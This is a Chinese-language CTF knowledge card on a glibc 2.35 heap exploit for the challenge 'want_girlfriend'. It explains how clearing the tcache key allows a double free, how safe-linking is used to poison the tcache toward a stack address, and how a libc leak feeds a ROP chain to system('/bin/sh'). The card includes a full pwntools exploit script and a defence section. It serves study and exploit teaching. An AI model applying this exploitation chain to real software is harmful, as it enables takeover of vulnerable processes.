---
id: binary-pwn-heap-glibc235-tcache-key-clear-stack-poison-rop
title: glibc 2.35 tcache key 清零绕过 double free：safe-linking 毒化到栈泄露 libc 后写 ROP
type: scenario
domain: binary
path: binary/pwn/heap
technique: tcache-key-clear-double-free-stack-poison-rop
aliases:
- 高版本打 tcache
- tcache key 清零
- glibc 2.35 tcache double free
- 栈上 tcache poisoning
- safe-linking 毒化栈
- want_girlfriend
tags:
- pwn
- heap
- glibc-2.35
- tcache
- tcache-key
- double-free
- safe-linking
- stack
- rop
- ctf
cve: []
severity: high
confidence: medium
affected_versions: glibc 2.35（原文标记 libc2.35）
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V274
  verified_at: '2026-11-08T00:29:54+08:00'
  notes: 已对照原文 want_girlfriend 核对：love()在flag<=0时清零new[0..2]（含tcache key）绕过double free、safe-linking公式target^(chunk>>12)、栈泄露mainret+0xb8、show读0x266200偏移得libcbase、第二次毒化loveret-0x38并用read(0,new+0x38,0x20)写pop_rdi//bin/sh/ret/system ROP均与正文exp及img01-05一致；affected_versions原文标记libc2.35。未复跑。
---

## 一句话结论

在 glibc 2.35（tcache key 与 safe-linking 同时生效）下，如果程序提供了“对已释放 chunk 的用户区前 0x18 字节清零”的操作（原文 `love()` 在 `flag <= 0` 时把 `new[0..2]` 置 0），攻击者就能把 tcache_entry 的 key 清成 0，绕过 `_int_free` 的 double-free 校验并反复释放同一 chunk；随后按 `目标 ^ (chunk>>12)` 伪造 tcache 的 next，把一次 malloc 返回到栈地址，先用 show 从栈上残留的 libc 指针泄露 libcbase，再第二次毒化到栈并利用程序的 `read(0, new+0x38, 0x20)` 把 ROP 链写到返回地址区域，触发返回即可 `system("/bin/sh")`。

## 原理

- **tcache entry 布局与 double-free 检查**：glibc 2.32+ 的 tcache_entry 覆盖在已释放 chunk 的用户区，`next` 在用户区 `+0`（safe-linking 编码：`next = (chunk_user >> 12) ^ ptr`），`key` 在用户区 `+8`（进程级随机 `tcache_key`）。`_int_free` 在 `e->key == tcache_key` 时会遍历该 size 的 tcache 链，发现同一物理 chunk 即报 `double free detected in tcache 2` 并 abort。
- **清零 key 为什么能绕过**：key 位于用户区 `+8`，free 之后仍可写。`love()` 在 `flag <= 0` 时执行 `*(_QWORD*)new = 0; *((_QWORD*)new+1) = 0; *((_QWORD*)new+2) = 0;`，把 fd、key 以及第三个 qword 一起清零。再次 `free(new)` 时 `key != tcache_key`，检查失明，chunk 被重新 `tcache_put` 到链头。重复“清零后再 free”会在同一个 tcache bin 里制造重复项，并把计数抬高到 3，从而有足够的分配次数消费重复项。
- **safe-linking 毒化公式**：分配器取出 tcache 头时只校验 16 字节对齐，不校验目标是否为真实 chunk。要把 next 指向目标 `T`，写入 `T ^ (chunk_user >> 12)`；其中 `chunk_user` 是当前 chunk 的用户区地址。首次释放时 tcache 为空，fd 被编码为 `chunk_user >> 12`，show 读回后左移 12 位即可还原 heap 基址（原文 `heapbase = u64(recv(6)) << 12`）。
- **把 chunk 开到栈上**：第一次毒化 `stack = mainret + 0xb8`，连续 malloc 时先返回重复的堆 chunk，随后返回该栈地址；栈上这个位置恰好存放一个 libc 指针（原文 libc 偏移 `0x266200`），show 读回即可算 `libcbase = leaked - 0x266200`。第二次毒化到 `loveret - 0x38`（`loveret = mainret - 0x20`），malloc 返回该地址后，`love()` 在 `flag > 0` 时执行 `read(0, new + 0x38, 0x20)`，写入位置正好落在 `loveret`，即返回地址区域，于是无需 `strcpy`（会被 `\x00` 截断）就能写入含空字节的 ROP 链。
- **为什么栈地址要 0x10 对齐**：tcache_get 对返回地址做 `aligned_OK` 检查，未对齐的栈地址会被判为 `unaligned tcache chunk` 并 abort；原文注释“stack 不能用 ret”即指不能把未对齐的返回地址本身直接当作分配目标，而要选其前方 0x38 或 0xb8 这类 0x10 对齐的位置。
- **单 chunk 限制的绕过**：create 只在 `flag == 1` 时拒绝创建，而 abandon 无论选择 Y/N 都会执行 `--flag`；通过 `abandon('N')` 可以把 flag 调到 0 或负数，从而连续 create，这也是后续多次布置 tcache 的前提。

## 触发条件

- x86-64 Linux，glibc 2.32+（原文实测 2.35），tcache 与 safe-linking 均开启；Full RELRO/PIE/Canary 不影响本链。
- 程序存在“free 后仍能写 chunk 用户区”的路径，尤其是能把 `+8` 的 key 改写为非当前 `tcache_key` 的操作（原文为清零前 0x18 字节的 `love()`）。
- 有 show/read 接口能读回已释放 chunk 的内容（泄露 safe-linking 编码的 fd）。
- 能在程序输出中拿到一个栈地址（原文 create 的第二次 `read` 未在拷贝源内补 NUL，`strcpy` 把 buf 后面的栈残留一并拷入堆块，show 的 0x20 字节读带出 0x7f 结尾的返回地址）。
- 目标 libc 中“栈上该位置”的符号偏移已知（原文 `0x266200`），且栈布局在目标环境下稳定。

## 利用步骤

1. `create(0x90, 'a', 'a'*0x18)` 后在 show 的输出中读到 0x7f 结尾的栈指针，`mainret = leaked + 8`（原文以该值作为 main 返回地址附近的锚点）。
2. `abandon('Y')` 释放 chunk；show 读已释放 chunk 的前 8 字节，`heapbase = u64(recv(6)) << 12`。
3. 连续执行 `love()`（清零 fd/key）→ `abandon('Y')`（free）→ `love()` → `abandon('Y')`，配合最初的 free，使同一 chunk 进入 tcache 3 次，链中形成自引用，计数为 3。
4. 令 `stack = mainret + 0xb8`；`create(0x90, p64(stack ^ ((heapbase+0x2a0)>>12)), b'\x00'*0x20)` 把 tcache next 改成栈地址。
5. 再 `create` 两次：第一次返回重复的堆 chunk，第二次返回栈地址；show 读取栈上残留的 libc 指针，`libcbase = leaked - 0x266200`。
6. 用 `abandon('N')` 把 flag 调回 0；重复“create/free/love/free/love/free”再次构造 3 次释放；令 `loveret = mainret - 0x20`，毒化 next 到 `loveret - 0x38`。
7. 再 `create` 消费重复项，使下一次 `create` 返回 `loveret - 0x38`；随后 `love()` 触发 `read(0, new+0x38, 0x20)`，写入 `pop rdi; /bin/sh; ret; system`（4 个 qword 正好 0x20 字节）。
8. 选择退出或让 main 返回，触发栈上 ROP 得到 shell。

## PoC

关键片段（偏移按原文目标 libc/环境，其他环境需重算）：

```python
from pwn import *
context(os='linux', arch='amd64')

def create(height=0x90, name=b'a', des=b'a'):
    p.sendlineafter("Please input you choice: \n", str(1))
    p.sendlineafter("Please input her height:", str(height))
    p.sendafter("Please input her name", name)
    p.sendafter("Plese input her describe", des)
def abandon(choose=b'Y'):
    p.sendlineafter("Please input you choice: \n", str(2))
    p.sendlineafter("Are you sure you want to abandon her now???\n", choose)
def show():
    p.sendlineafter("Please input you choice: \n", str(3))
def love():
    p.sendlineafter("Please input you choice: \n", str(520))

# 1) 栈地址泄露
create(0x90, b'a', b'a'*0x18)
show()
p.recvuntil("she is "); p.recvuntil(b'a'*0x18)
mainret = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) + 8

# 2) heap 泄露 + 3 次 free 同一 chunk
abandon('Y'); show()
p.recvuntil("Your girlfriend is ")
heapbase = u64(p.recv(6).ljust(8, b'\x00')) << 12
love(); abandon('Y'); love(); abandon('Y')

# 3) 第一次毒化到栈，泄露 libc
stack = mainret + 0xb8
create(0x90, p64(((heapbase+0x2a0) >> 12) ^ stack), b'\x00'*0x20)
create(0x90, b'x\x00', b'a')
create(0x90, b'\x00', b'a')
show(); p.recvuntil("Your girlfriend is ")
libcbase = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x266200

# 4) 第二次毒化到栈，写 ROP
abandon('N')
create(0x90, b'\x00', b'a'); abandon('Y')
love(); abandon('Y'); love(); abandon('Y')
loveret = mainret - 0x20
create(0x90, p64(((heapbase+0x2a0) >> 12) ^ (loveret-0x38)), b'\x00'*0x20)
create(0x90, b'\x00', b'a')
create(0x90, b'\x00', b'\x00')
pop_rdi = libcbase + 0x2a3e5
ret = libcbase + 0x29139
bin_addr = libcbase + next(libc.search(b'/bin/sh'))
system_addr = libcbase + libc.sym['system']
payload = p64(pop_rdi) + p64(bin_addr) + p64(ret) + p64(system_addr)  # 共 0x20 字节
love(); p.sendafter("Please input your love", payload)
p.interactive()
```

> 说明：`0x266200` 是原文栈上泄露的 libc 指针偏移，需按目标 libc 重新确认；gadget 与 `/bin/sh` 偏移同样应以实际 libc 为准。上述片段只保留触发顺序，未在本机复跑。

## 变体与关联

- **清零方式变体**：不一定要清零 fd，只要把 `+8` 的 key 改成非当前 `tcache_key` 即可；若有常规 UAF edit，可直接写 `p64(next) + p64(0)`。同一思路在更高版本（glibc 2.42+ 的 tcache_key）上打 `free@GOT` 见 [[binary-pwn-heap-glibc243-tcache-key-bypass-got-system]]。
- **栈泄露方式变体**：本卡依赖程序把栈残留通过 `strcpy` 带入堆块；若没有这种泄露，可用 `environ`（[[binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop]]）或 safe-linking fd 的双重异或从 libc 中存放的栈指针还原（[[binary-pwn-heap-tcache-safe-linking-stack-leak-chunk-to-stack]]）。
- **目标变体**：把第二次毒化的目标从返回地址改成 `__free_hook`（2.34 前）、GOT（Partial RELRO）或 FSOP 结构；本卡选择栈是因为原文环境 Full RELRO 且 tcache 可直达栈。
- 关联：[[binary-pwn-heap-safe-linking-self-xor-heap-address]]（safe-linking 自异或恢复堆地址）、[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（常规 libc 泄露）。

## 检测与防御

- 修复：free 后立即置空指针；禁止对已释放对象执行 write/read；所有写接口按 chunk 生命周期与长度校验。
- 加固：升级 glibc 跟进 tcache key/safe-linking；对 tcache 链表做完整性校验；开启 Full RELRO/PIE/Canary（不能阻止本链，但提高其他路径成本）。
- 检测：同一 chunk 被多次 free；tcache `fd` 解码后指向栈或非堆地址；malloc 返回栈范围地址；`unaligned tcache chunk`/`double free detected in tcache` 等报错；进程在退出前出现栈上 ROP 特征（`pop rdi; ret` 链）。
- 该场景为 CTF/授权测试利用；生产环境不要依赖“只允许一个对象”这类计数逻辑作为安全边界。
